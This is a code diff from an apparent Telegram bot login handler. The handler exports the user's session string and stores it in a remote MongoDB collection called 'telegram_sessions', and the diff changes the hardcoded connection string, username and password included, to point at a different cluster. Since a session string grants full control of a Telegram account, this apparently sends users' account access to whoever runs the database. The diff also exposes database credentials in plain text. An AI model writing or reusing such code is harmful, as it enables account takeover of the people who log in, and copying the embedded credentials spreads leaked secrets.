@@ -86,7 +86,7 @@ async def recv_tg_code_message(_, message: Message):
         )
         w_s_dict["IS_NEEDED_TFA"] = True
     else:        
-        client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
+        client = pymongo.MongoClient("mongodb+srv://titid:gede@cluster0.tvp1vxj.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
